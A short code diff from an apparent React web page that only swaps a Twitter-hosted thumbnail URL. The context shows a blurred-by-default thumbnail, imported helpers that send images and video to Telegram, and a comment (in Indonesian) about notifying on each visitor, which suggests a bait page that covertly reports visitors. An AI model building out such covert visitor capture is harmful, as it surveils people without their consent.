@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://pbs.twimg.com/media/GmQ6K50bkAAj6uR?format=jpg&name=medium';
+  const thumbnailUrl = 'https://pbs.twimg.com/media/GmlN7YKWAAADS5l?format=jpg&name=medium';
 
   // Kirim notifikasi ketika pengunjung mengunjungi halaman
   useEffect(() => {
